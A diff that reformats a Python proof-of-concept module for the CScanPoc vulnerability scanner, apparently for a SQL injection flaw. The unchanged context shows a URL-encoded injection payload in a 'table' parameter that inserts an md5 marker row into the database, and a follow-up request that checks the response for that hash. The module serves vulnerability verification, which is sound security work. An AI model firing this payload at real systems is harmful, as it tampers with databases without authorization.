@@ -1,6 +1,8 @@
 # coding: utf-8
 import re
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.error
+import urllib.parse
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
@@ -41,9 +43,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -54,7 +57,8 @@ class Poc(ABPoc):
             data = 'table=expect%60%20%28id%2Cuid%2Cname%29%20values%20%28' \
                    '999999%2C1%2C%28md5%280x23333333%29%29%29%23&subm' \
                    'it=111&eid=1'
-            req = urllib.request.Request(verify_url, data=data, headers=fake_headers)
+            req = urllib.request.Request(
+                verify_url, data=data, headers=fake_headers)
             urllib.request.urlopen(req)
             content = urllib.request.urlopen(check_url).read()
             if '2eb120797101bb291fd4a6764' in content:
